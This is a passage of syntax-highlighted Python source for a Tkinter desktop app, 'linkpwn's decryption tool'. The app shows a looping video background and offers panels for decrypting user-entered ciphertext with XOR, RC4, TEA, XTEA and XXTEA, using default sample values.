language_">self</span>.cap.get(cv2.CAP_PROP_FPS) <span class="keyword">or</span> <span class="number">30</span></span><br><span class="line">            <span class="variable language_">self</span>.start_playback()</span><br><span class="line">            <span class="variable language_">self</span>.error_count = <span class="number">0</span>  <span class="comment"># 重置错误计数</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="variable language_">self</span>.error_count += <span class="number">1</span></span><br><span class="line">            <span class="variable language_">self</span>._show_error(<span class="string">f&quot;⚠️ 视频打开错误（尝试 <span class="subst">&#123;self.error_count&#125;</span>/5）：<span class="subst">&#123;<span class="built_in">str</span>(e)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 创建错误提示覆盖层</span></span><br><span class="line">            <span class="variable language_">self</span>._create_error_overlay(<span class="string">f&quot;视频加载失败 <span class="subst">&#123;self.error_count&#125;</span>/5\n正在重试...&quot;</span>)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 尝试重新加载</span></span><br><span class="line">            <span class="keyword">if</span> <span class="variable language_">self</span>.error_count &lt;= <span class="number">5</span> <span class="keyword">and</span> force:</span><br><span class="line">                <span class="variable language_">self</span>.parent.after(<span class="number">3000</span>, <span class="variable language_">self</span>._init_video)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="variable language_">self</span>._show_error(<span class="string">&quot;⚠️ 视频加载失败，使用默认背景&quot;</span>, critical=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_show_error</span>(<span class="params">self, msg, critical=<span class="literal">False</span></span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;显示错误信息&quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">if</span> DEBUG:</span><br><span class="line">            <span class="built_in">print</span>(msg)</span><br><span class="line">        <span class="keyword">if</span> critical:</span><br><span class="line">            messagebox.showerror(<span class="string">&quot;视频初始化失败&quot;</span>, msg)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_create_error_overlay</span>(<span class="params">self, text</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;创建错误提示覆盖层（半透明）&quot;&quot;&quot;</span></span><br><span class="line">        <span class="comment"># 清除现有覆盖层</span></span><br><span class="line">        <span class="keyword">for</span> widget <span class="keyword">in</span> <span class="variable language_">self</span>.parent.winfo_children():</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">isinstance</span>(widget, tk.Canvas) <span class="keyword">and</span> widget._name.startswith(<span class="string">&quot;error_overlay&quot;</span>):</span><br><span class="line">                widget.destroy()</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 创建新覆盖层（半透明黑色背景）</span></span><br><span class="line">        overlay = tk.Canvas(</span><br><span class="line">            <span class="variable language_">self</span>.parent,</span><br><span class="line">            width=<span class="variable language_">self</span>.width,</span><br><span class="line">            height=<span class="variable language_">self</span>.height,</span><br><span class="line">            bg=<span class="string">&quot;black&quot;</span>,</span><br><span class="line">            bd=<span class="number">0</span>,</span><br><span class="line">            highlightthickness=<span class="number">0</span></span><br><span class="line">        )</span><br><span class="line">        overlay.place(x=<span class="number">0</span>, y=<span class="number">0</span>)</span><br><span class="line">        overlay._name = <span class="string">&quot;error_overlay&quot;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 半透明背景（30%透明度效果）</span></span><br><span class="line">        overlay.create_rectangle(</span><br><span class="line">            <span class="number">0</span>, <span class="number">0</span>, <span class="variable language_">self</span>.width, <span class="variable language_">self</span>.height,</span><br><span class="line">            fill=<span class="string">&quot;black&quot;</span>,</span><br><span class="line">            stipple=<span class="string">&quot;gray50&quot;</span></span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 错误文本</span></span><br><span class="line">        overlay.create_text(</span><br><span class="line">            <span class="variable language_">self</span>.width / <span class="number">2</span>, <span class="variable language_">self</span>.height / <span class="number">2</span>,</span><br><span class="line">            text=text,</span><br><span class="line">            fill=<span class="string">&quot;white&quot;</span>,</span><br><span class="line">            font=(<span class="string">&quot;微软雅黑&quot;</span>, <span class="number">14</span>, <span class="string">&quot;bold&quot;</span>)</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">start_playback</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;启动视频播放&quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">if</span> <span class="variable language_">self</span>.cap <span class="keyword">and</span> <span class="keyword">not</span> <span class="variable language_">self</span>.thread:</span><br><span class="line">            <span class="variable language_">self</span>.stop_flag = <span class="literal">False</span></span><br><span class="line">            <span class="variable language_">self</span>.thread = threading.Thread(</span><br><span class="line">                target=<span class="variable language_">self</span>._update_video,</span><br><span class="line">                daemon=<span class="literal">True</span></span><br><span class="line">            )</span><br><span class="line">            <span class="variable language_">self</span>.thread.start()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">stop_playback</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;停止视频播放并释放资源&quot;&quot;&quot;</span></span><br><span class="line">        <span class="variable language_">self</span>.stop_flag = <span class="literal">True</span></span><br><span class="line">        <span class="variable language_">self</span>.running = <span class="literal">False</span></span><br><span class="line">        <span class="keyword">if</span> <span class="variable language_">self</span>.thread <span class="keyword">and</span> <span class="variable language_">self</span>.thread.is_alive():</span><br><span class="line">            <span class="variable language_">self</span>.thread.join(timeout=<span class="number">3</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="variable language_">self</span>.cap:</span><br><span class="line">            <span class="variable language_">self</span>.cap.release()</span><br><span class="line">            <span class="variable language_">self</span>.cap = <span class="literal">None</span></span><br><span class="line">        <span class="keyword">if</span> DEBUG:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;🎥 视频播放已停止&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_update_video</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;视频帧更新循环&quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">while</span> <span class="variable language_">self</span>.running <span class="keyword">and</span> <span class="keyword">not</span> <span class="variable language_">self</span>.stop_flag:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="keyword">if</span> <span class="keyword">not</span> <span class="variable language_">self</span>.cap <span class="keyword">or</span> <span class="keyword">not</span> <span class="variable language_">self</span>.cap.isOpened():</span><br><span class="line">                    <span class="comment"># 尝试重新打开视频</span></span><br><span class="line">                    <span class="variable language_">self</span>._init_video()</span><br><span class="line">                    time.sleep(<span class="number">1</span>)</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">                ret, frame = <span class="variable language_">self</span>.cap.read()</span><br><span class="line">                <span class="keyword">if</span> <span class="keyword">not</span> ret:</span><br><span class="line">                    <span class="comment"># 视频结束，从头开始</span></span><br><span class="line">                    <span class="variable language_">self</span>.cap.<span class="built_in">set</span>(cv2.CAP_PROP_POS_FRAMES, <span class="number">0</span>)</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">                <span class="comment"># 处理视频帧</span></span><br><span class="line">                frame = cv2.resize(frame, (<span class="variable language_">self</span>.width, <span class="variable language_">self</span>.height))</span><br><span class="line">                frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)</span><br><span class="line">                img = Image.fromarray(frame)</span><br><span class="line">                imgtk = ImageTk.PhotoImage(image=img)</span><br><span class="line"></span><br><span class="line">                <span class="comment"># 更新显示</span></span><br><span class="line">                <span class="variable language_">self</span>.video_label.config(image=imgtk)</span><br><span class="line">                <span class="variable language_">self</span>.video_label.image = imgtk</span><br><span class="line">                time.sleep(<span class="number">1.0</span> / <span class="variable language_">self</span>.fps)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                <span class="keyword">if</span> DEBUG:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f&quot;⚠️ 视频处理错误：<span class="subst">&#123;<span class="built_in">str</span>(e)&#125;</span>&quot;</span>)</span><br><span class="line">                time.sleep(<span class="number">1</span>)  <span class="comment"># 错误后等待，避免CPU占用过高</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">DecryptApp</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, root</span>):</span><br><span class="line">        <span class="variable language_">self</span>.root = root</span><br><span class="line">        <span class="variable language_">self</span>.root.title(<span class="string">&quot;✨ linkpwn的解密工具 ✨&quot;</span>)</span><br><span class="line">        <span class="variable language_">self</span>.root.geometry(<span class="string">&quot;800x600&quot;</span>)</span><br><span class="line">        <span class="variable language_">self</span>.root.resizable(<span class="literal">False</span>, <span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 设置窗口图标（示例图标路径，可替换为实际图标）</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            root.iconbitmap(<span class="string">&quot;linkpwn.ico&quot;</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">if</span> DEBUG:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;⚠️ 图标加载失败，使用默认图标&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 强制使用视频背景</span></span><br><span class="line">        video_path = <span class="string">&quot;富士山的星空.mp4&quot;</span></span><br><span class="line">        <span class="variable language_">self</span>.video_bg = VideoBackground(root, video_path)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 创建欢迎界面（移除半透明遮罩）</span></span><br><span class="line">        <span class="variable language_">self</span>.create_welcome_screen()</span><br><span class="line">        <span class="variable language_">self</span>.create_status_bar()</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 注册窗口关闭事件</span></span><br><span class="line">        <span class="variable language_">self</span>.root.protocol(<span class="string">&quot;WM_DELETE_WINDOW&quot;</span>, <span class="variable language_">self</span>.on_close)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">create_welcome_screen</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;创建欢迎界面（仅保留视频背景上的UI元素）&quot;&quot;&quot;</span></span><br><span class="line">        <span class="comment"># 欢迎标题（直接放置在视频背景上）</span></span><br><span class="line">        title = UIBuilder.create_title(</span><br><span class="line">            <span class="variable language_">self</span>.root,</span><br><span class="line">            <span class="string">&quot;欢迎使用linkpwn的解密工具&quot;</span>,</span><br><span class="line">            font_size=<span class="number">36</span>,</span><br><span class="line">            emoji=<span class="string">&quot;✨&quot;</span>,</span><br><span class="line">            bg=<span class="literal">None</span>  <span class="comment"># 透明背景</span></span><br><span class="line">        )</span><br><span class="line">        title.configure(fg=<span class="string">&quot;#5dade2&quot;</span>)  <span class="comment"># 仅设置标题字体为浅蓝色</span></span><br><span class="line">        title.place(relx=<span class="number">0.5</span>, rely=<span class="number">0.3</span>, anchor=tk.CENTER)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 进入按钮（直接放置在视频背景上）</span></span><br><span class="line">        enter_btn = UIBuilder.create_button(</span><br><span class="line">            <span class="variable language_">self</span>.root,</span><br><span class="line">            <span class="string">&quot;进入解密工具&quot;</span>,</span><br><span class="line">            <span class="variable language_">self</span>.open_algorithm_selector,</span><br><span class="line">            bg=<span class="string">&quot;#FF6B6B&quot;</span>,</span><br><span class="line">            font_size=<span class="number">18</span>,</span><br><span class="line">            emoji=<span class="string">&quot;🔓&quot;</span>,</span><br><span class="line">            bg_hover=<span class="string">&quot;#FF4D4F&quot;</span></span><br><span class="line">        )</span><br><span class="line">        enter_btn.place(relx=<span class="number">0.5</span>, rely=<span class="number">0.5</span>, anchor=tk.CENTER)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 版权信息（直接放置在视频背景上）</span></span><br><span class="line">        copyright_text = UIBuilder.create_label(</span><br><span class="line">            <span class="variable language_">self</span>.root,</span><br><span class="line">            <span class="string">&quot;© 2025 linkpwn. 保留所有权利.&quot;</span>,</span><br><span class="line">            font_size=<span class="number">10</span>,</span><br><span class="line">            fg=<span class="string">&quot;#999999&quot;</span>,</span><br><span class="line">            bg=<span class="literal">None</span>  <span class="comment"># 透明背景</span></span><br><span class="line">        )</span><br><span class="line">        copyright_text.place(relx=<span class="number">0.5</span>, rely=<span class="number">0.95</span>, anchor=tk.CENTER)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">open_algorithm_selector</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;打开算法选择窗口（优化背景显示）&quot;&quot;&quot;</span></span><br><span class="line">        <span class="variable language_">self</span>.algorithm_window = tk.Toplevel(<span class="variable language_">self</span>.root)</span><br><span class="line">        <span class="variable language_">self</span>.algorithm_window.title(<span class="string">&quot;💡 选择解密算法&quot;</span>)</span><br><span class="line">        <span class="variable language_">self</span>.algorithm_window.geometry(<span class="string">&quot;600x400&quot;</span>)</span><br><span class="line">        <span class="variable language_">self</span>.algorithm_window.resizable(<span class="literal">False</span>, <span class="literal">False</span>)</span><br><span class="line">        <span class="variable language_">self</span>.algorithm_window.transient(<span class="variable language_">self</span>.root)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 创建半透明背景（仅在视频加载失败时显示）</span></span><br><span class="line">        bg = tk.Canvas(</span><br><span class="line">            <span class="variable language_">self</span>.algorithm_window,</span><br><span class="line">            width=<span class="number">600</span>,</span><br><span class="line">            height=<span class="number">400</span>,</span><br><span class="line">            bg=<span class="string">&quot;black&quot;</span>,</span><br><span class="line">            highlightthickness=<span class="number">0</span></span><br><span class="line">        )</span><br><span class="line">        bg.pack(fill=<span class="string">&quot;both&quot;</span>, expand=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 标题</span></span><br><span class="line">        title = UIBuilder.create_title(</span><br><span class="line">            <span class="variable language_">self</span>.algorithm_window,</span><br><span class="line">            <span class="string">&quot;选择解密算法&quot;</span>,</span><br><span class="line">            font_size=<span class="number">24</span>,</span><br><span class="line">            emoji=<span class="string">&quot;🔐&quot;</span></span><br><span class="line">        )</span><br><span class="line">        title.place(relx=<span class="number">0.5</span>, y=<span class="number">30</span>, anchor=tk.CENTER)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 分隔线</span></span><br><span class="line">        sep = tk.Frame(<span class="variable language_">self</span>.algorithm_window, height=<span class="number">2</span>, bg=<span class="string">&quot;#4ECDC4&quot;</span>)</span><br><span class="line">        sep.place(x=<span class="number">50</span>, y=<span class="number">70</span>, width=<span class="number">500</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 算法按钮配置</span></span><br><span class="line">        algorithms = [</span><br><span class="line">            (<span class="string">&quot;xor&quot;</span>, <span class="string">&quot;❌ XOR解密&quot;</span>),</span><br><span class="line">            (<span class="string">&quot;rc4&quot;</span>, <span class="string">&quot;🔒 RC4解密&quot;</span>),</span><br><span class="line">            (<span class="string">&quot;tea&quot;</span>, <span class="string">&quot;🍵 TEA解密&quot;</span>),</span><br><span class="line">            (<span class="string">&quot;xtea&quot;</span>, <span class="string">&quot;🍵 XTEA解密&quot;</span>),</span><br><span class="line">            (<span class="string">&quot;xxtea&quot;</span>, <span class="string">&quot;🍵 XXTEA解密&quot;</span>),</span><br><span class="line">        ]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> idx, (alg, text) <span class="keyword">in</span> <span class="built_in">enumerate</span>(algorithms):</span><br><span class="line">            btn = tk.Button(</span><br><span class="line">                <span class="variable language_">self</span>.algorithm_window,</span><br><span class="line">                text=text,</span><br><span class="line">                font=(<span class="string">&quot;微软雅黑&quot;</span>, <span class="number">14</span>, <span class="string">&quot;bold&quot;</span>),</span><br><span class="line">                bg=<span class="string">&quot;#4ECDC4&quot;</span>,</span><br><span class="line">                fg=<span class="string">&quot;white&quot;</span>,</span><br><span class="line">                relief=<span class="string">&quot;flat&quot;</span>,</span><br><span class="line">                command=<span class="keyword">lambda</span> a=alg: <span class="variable language_">self</span>.open_decrypt_window(a)</span><br><span class="line">            )</span><br><span class="line">            x = <span class="number">100</span> <span class="keyword">if</span> idx % <span class="number">2</span> == <span class="number">0</span> <span class="keyword">else</span> <span class="number">350</span></span><br><span class="line">            y = <span class="number">120</span> + (idx // <span class="number">2</span>) * <span class="number">80</span></span><br><span class="line">            btn.place(x=x, y=y, width=<span class="number">200</span>, height=<span class="number">60</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">open_decrypt_window</span>(<span class="params">self, algorithm</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;打开解密窗口（优化背景显示）&quot;&quot;&quot;</span></span><br><span class="line">        <span class="comment"># 销毁已存在的解密窗口</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(<span class="variable language_">self</span>, <span class="string">&#x27;decrypt_window&#x27;</span>) <span class="keyword">and</span> <span class="variable language_">self</span>.decrypt_window.winfo_exists():</span><br><span class="line">            <span class="variable language_">self</span>.decrypt_window.destroy()</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">self</span>.decrypt_window = tk.Toplevel(<span class="variable language_">self</span>.root)</span><br><span class="line">        <span class="variable language_">self</span>.decrypt_window.title(<span class="string">f&quot;💬 <span class="subst">&#123;self.get_algorithm_name(algorithm)&#125;</span>解密面板&quot;</span>)</span><br><span class="line">        <span class="variable language_">self</span>.decrypt_window.geometry(<span class="string">&quot;600x450&quot;</span>)</span><br><span class="line">        <span class="variable language_">self</span>.decrypt_window.resizable(<span class="literal">False</span>, <span class="literal">False</span>)</span><br><span class="line">        <span class="variable language_">self</span>.decrypt_window.transient(<span class="variable language_">self</span>.root)</span><br><span class="line"></span><br><span class="line">        panel = tk.Canvas(</span><br><span class="line">            <span class="variable language_">self</span>.decrypt_window,</span><br><span class="line">            width=<span class="number">600</span>,</span><br><span class="line">            height=<span class="number">450</span>,</span><br><span class="line">            bg=<span class="string">&quot;black&quot;</span>,</span><br><span class="line">            highlightthickness=<span class="number">0</span>,</span><br><span class="line">            bd=<span class="number">0</span>,</span><br><span class="line">            relief=<span class="string">&quot;flat&quot;</span></span><br><span class="line">        )</span><br><span class="line">        panel.pack(fill=<span class="string">&quot;both&quot;</span>, expand=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 标题</span></span><br><span class="line">        title = UIBuilder.create_title(</span><br><span class="line">            panel,</span><br><span class="line">            <span class="string">f&quot;<span class="subst">&#123;self.get_algorithm_name(algorithm)&#125;</span>解密工具&quot;</span>,</span><br><span class="line">            font_size=<span class="number">24</span>,</span><br><span class="line">            bg=<span class="string">&quot;black&quot;</span></span><br><span class="line">        )</span><br><span class="line">        title.place(relx=<span class="number">0.5</span>, y=<span class="number">30</span>, anchor=tk.CENTER)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 分隔线</span></span><br><span class="line">        sep = tk.Frame(panel, height=<span class="number">2</span>, bg=<span class="string">&quot;#4ECDC4&quot;</span>)</span><br><span class="line">        sep.place(x=<span class="number">50</span>, y=<span class="number">70</span>, width=<span class="number">500</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 算法说明</span></span><br><span class="line">        info = UIBuilder.create_algorithm_info(panel, algorithm)</span><br><span class="line">        info.place(x=<span class="number">50</span>, y=<span class="number">90</span>, width=<span class="number">500</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 密文输入框</span></span><br><span class="line">        cipher_frame = tk.Frame(panel, bg=<span class="string">&quot;#1a1a2e&quot;</span>)</span><br><span class="line">        cipher_frame.place(x=<span class="number">50</span>, y=<span class="number">130</span>, width=<span class="number">500</span>, height=<span class="number">100</span>)</span><br><span class="line"></span><br><span class="line">        cipher_label = UIBuilder.create_label(cipher_frame, <span class="string">&quot;密文:&quot;</span>, font_size=<span class="number">12</span>)</span><br><span class="line">        cipher_label.pack(anchor=<span class="string">&quot;w&quot;</span>, pady=(<span class="number">0</span>, <span class="number">5</span>))</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">self</span>.cipher_entry = tk.Text(</span><br><span class="line">            cipher_frame,</span><br><span class="line">            width=<span class="number">58</span>,</span><br><span class="line">            height=<span class="number">3</span>,</span><br><span class="line">            font=(<span class="string">&quot;Consolas&quot;</span>, <span class="number">12</span>),</span><br><span class="line">            bg=<span class="string">&quot;#2a2a3e&quot;</span>,</span><br><span class="line">            fg=<span class="string">&quot;white&quot;</span>,</span><br><span class="line">            insertbackground=<span class="string">&quot;white&quot;</span>,</span><br><span class="line">            relief=<span class="string">&quot;flat&quot;</span>,</span><br><span class="line">            padx=<span class="number">10</span>,</span><br><span class="line">            pady=<span class="number">5</span></span><br><span class="line">        )</span><br><span class="line">        <span class="variable language_">self</span>.cipher_entry.pack(fill=<span class="string">&quot;x&quot;</span>)</span><br><span class="line">        <span class="variable language_">self</span>.cipher_entry.insert(<span class="string">&quot;1.0&quot;</span>, <span class="variable language_">self</span>.get_default_ciphertext(algorithm))</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 密钥输入框</span></span><br><span class="line">        key_frame = tk.Frame(panel, bg=<span class="string">&quot;#1a1a2e&quot;</span>)</span><br><span class="line">        key_frame.place(x=<span class="number">50</span>, y=<span class="number">250</span>, width=<span class="number">500</span>, height=<span class="number">80</span>)</span><br><span class="line"></span><br><span class="line">        key_label = UIBuilder.create_label(key_frame, <span class="string">&quot;密钥:&quot;</span>, font_size=<span class="number">12</span>)</span><br><span class="line">        key_label.pack(anchor=<span class="string">&quot;w&quot;</span>, pady=(<span class="number">0</span>, <span class="number">5</span>))</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">self</span>.key_entry = tk.Entry(</span><br><span class="line">            key_frame,</span><br><span class="line">            width=<span class="number">58</span>,</span><br><span class="line">            font=(<span class="string">&quot;Consolas&quot;</span>, <span class="number">12</span>),</span><br><span class="line">            bg=<span class="string">&quot;#2a2a3e&quot;</span>,</span><br><span class="line">            fg=<span class="string">&quot;white&quot;</span>,</span><br><span class="line">            insertbackground=<span class="string">&quot;white&quot;</span>,</span><br><span class="line">            relief=<span class="string">&quot;flat&quot;</span></span><br><span class="line">        )</span><br><span class="line">        <span class="variable language_">self</span>.key_entry.pack(fill=<span class="string">&quot;x&quot;</span>)</span><br><span class="line">        <span class="variable language_">self</span>.key_entry.insert(<span class="number">0</span>, <span class="variable language_">self</span>.get_default_key(algorithm))</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 按钮区域</span></span><br><span class="line">        btn_frame = tk.Frame(panel, bg=<span class="string">&quot;#1a1a2e&quot;</span>)</span><br><span class="line">        btn_frame.place(x=<span class="number">50</span>, y=<span class="number">340</span>, width=<span class="number">500</span>, height=<span class="number">40</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 解密按钮</span></span><br><span class="line">        decrypt_btn = UIBuilder.create_button(</span><br><span class="line">            btn_frame,</span><br><span class="line">            <span class="string">&quot;开始解密&quot;</span>,</span><br><span class="line">            <span class="keyword">lambda</span>: <span class="variable language_">self</span>.perform_decryption(algorithm),</span><br><span class="line">            bg=<span class="string">&quot;#FF6B6B&quot;</span>,</span><br><span class="line">            font_size=<span class="number">14</span>,</span><br><span class="line">            emoji=<span class="string">&quot;🔓&quot;</span></span><br><span class="line">        )</span><br><span class="line">        decrypt_btn.pack(side=<span class="string">&quot;left&quot;</span>, padx=(<span class="number">150</span>, <span class="number">0</span>))</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 返回按钮</span></span><br><span class="line">        back_btn = UIBuilder.create_button(</span><br><span class="line">            btn_frame,</span><br><span class="line">            <span class="string">&quot;返回&quot;</span>,</span><br><span class="line">            <span class="variable language_">self</span>.decrypt_window.destroy,</span><br><span class="line">            bg=<span class="string">&quot;#666666&quot;</span>,</span><br><span class="line">            font_size=<span class="number">10</span>,</span><br><span class="line">            emoji=<span class="string">&quot;◀&quot;</span></span><br><span class="line">        )</span><br><span class="line">        back_btn.pack(side=<span class="string">&quot;right&quot;</span>, padx=(<span class="number">0</span>, <span class="number">20</span>))</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 提示文本</span></span><br><span class="line">        hint = UIBuilder.create_label(</span><br><span class="line">            panel,</span><br><span class="line">            <span class="string">&quot;💡 提示: 输入密文和密钥后点击解密按钮&quot;</span>,</span><br><span class="line">            font_size=<span class="number">10</span>,</span><br><span class="line">            fg=<span class="string">&quot;#999999&quot;</span></span><br><span class="line">        )</span><br><span class="line">        hint.place(x=<span class="number">50</span>, y=<span class="number">400</span>, width=<span class="number">500</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_algorithm_name</span>(<span class="params">self, algorithm</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;获取算法名称&quot;&quot;&quot;</span></span><br><span class="line">        names = &#123;</span><br><span class="line">            <span class="string">&quot;xor&quot;</span>: <span class="string">&quot;XOR&quot;</span>,</span><br><span class="line">            <span class="string">&quot;rc4&quot;</span>: <span class="string">&quot;RC4&quot;</span>,</span><br><span class="line">            <span class="string">&quot;tea&quot;</span>: <span class="string">&quot;TEA&quot;</span>,</span><br><span class="line">            <span class="string">&quot;xtea&quot;</span>: <span class="string">&quot;XTEA&quot;</span>,</span><br><span class="line">            <span class="string">&quot;xxtea&quot;</span>: <span class="string">&quot;XXTEA&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> names.get(algorithm, algorithm.upper())</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_default_ciphertext</span>(<span class="params">self, algorithm</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;获取默认密文&quot;&quot;&quot;</span></span><br><span class="line">        defaults = &#123;</span><br><span class="line">            <span class="string">&quot;xor&quot;</span>: <span class="string">&quot;1a2b3c4d5e6f&quot;</span>,</span><br><span class="line">            <span class="string">&quot;rc4&quot;</span>: <span class="string">&quot;730e7d1c4a1e&quot;</span>,</span><br><span class="line">            <span class="string">&quot;tea&quot;</span>: <span class="string">&quot;0123456789abcdef&quot;</span>,</span><br><span class="line">            <span class="string">&quot;xtea&quot;</span>: <span class="string">&quot;0123456789abcdef&quot;</span>,</span><br><span class="line">            <span class="string">&quot;xxtea&quot;</span>: <span class="string">&quot;0123456789abcdef&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> defaults.get(algorithm, <span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_default_key</span>(<span class="params">self, algorithm</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;获取默认密钥&quot;&quot;&quot;</span></span><br><span class="line">        defaults = &#123;</span><br><span class="line">            <span class="string">&quot;xor&quot;</span>: <span class="string">&quot;secret&quot;</span>,</span><br><span class="line">            <span class="string">&quot;rc4&quot;</span>: <span class="string">&quot;key12345&quot;</span>,</span><br><span class="line">            <span class="string">&quot;tea&quot;</span>: <span class="string">&quot;1234567890123456&quot;</span>,  <span class="comment"># 16字节密钥</span></span><br><span class="line">            <span class="string">&quot;xtea&quot;</span>: <span class="string">&quot;1234567890123456&quot;</span>,  <span class="comment"># 16字节密钥</span></span><br><span class="line">            <span class="string">&quot;xxtea&quot;</span>: <span class="string">&quot;1234567890123456&quot;</span>  <span class="comment"># 16字节密钥</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> defaults.get(algorithm, <span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">create_status_bar</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;创建状态栏&quot;&quot;&quot;</span></span><br><span class="line">        <span class="variable language_">self</span>.status = tk.Label(</span><br><span class="line">            <span class="variable language_">self</span>.root,</span><br><span class="line">            text=<span class="string">&quot;✨ 就绪 | linkpwn的解密工具 v1.0 | 安全解密 ✨&quot;</span>,</span><br><span class="line">            bd=<span class="number">1</span>,</span><br><span class="line">            relief=tk.SUNKEN,</span><br><span class="line">            anchor=tk.W,</span><br><span class="line">            font=(<span class="string">&quot;微软雅黑&quot;</span>, <span class="number">9</span>),</span><br><span class="line">            fg=<span class="string">&quot;#CCCCCC&quot;</span>,</span><br><span class="line">            bg=<span class="string">&quot;#1a1a2e&quot;</span></span><br><span class="line">        )</span><br><span class="line">        <span class="variable language_">self</span>.status.pack(side=tk.BOTTOM, fill=tk.X)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">perform_decryption</span>(<span class="params">self, algorithm</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;执行解密操作&quot;&quot;&quot;</span></span><br><span class="line">        ciphertext = <span class="variable language_">self</span>.cipher_entry.get(<span class="string">&quot;1.0&quot;</span>, tk.END).strip()</span><br><span class="line">        key = <span class="variable language_">self</span>.key_entry.get().strip()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> ciphertext:</span><br><span class="line">            <span class="variable language_">self</span>.status.config(text=<span class="string">&quot;🛑 错误: 密文不能为空&quot;</span>)</span><br><span class="line">            messagebox.showerror(<span class="string">&quot;😢 错误&quot;</span>, <span class="string">&quot;密文不能为空哦!&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> key:</span><br><span class="line">            <span class="variable 